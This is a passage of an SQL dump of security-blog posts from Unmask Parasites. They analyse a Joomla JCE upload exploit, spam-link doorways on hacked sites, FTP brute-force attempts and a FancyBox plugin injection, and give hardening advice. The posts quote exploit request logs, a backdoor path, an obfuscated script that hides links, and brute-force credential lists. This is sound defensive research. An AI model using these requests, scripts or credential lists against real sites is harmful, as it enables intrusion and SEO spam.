INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (96, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (97, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (98, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (99, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (100, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (101, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 